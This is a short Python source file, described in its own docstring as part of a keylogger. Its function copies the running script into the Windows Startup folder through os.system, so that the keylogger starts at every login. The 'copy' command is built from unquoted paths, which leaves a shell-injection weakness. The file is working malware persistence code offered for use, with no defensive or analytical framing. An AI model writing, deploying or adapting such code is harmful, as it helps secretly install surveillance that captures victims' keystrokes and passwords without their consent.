import os

def add_to_startup(file_path, file_name):
    """
    Add the keylogger to system startup (Windows example).
    """
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    if not os.path.exists(startup_path):
        os.makedirs(startup_path)
    os.system(f'copy {file_path} {startup_path}/{file_name}')

# Example usage
if __name__ == "__main__":
    current_path = os.path.abspath(__file__)
    add_to_startup(current_path, "keylogger.py")
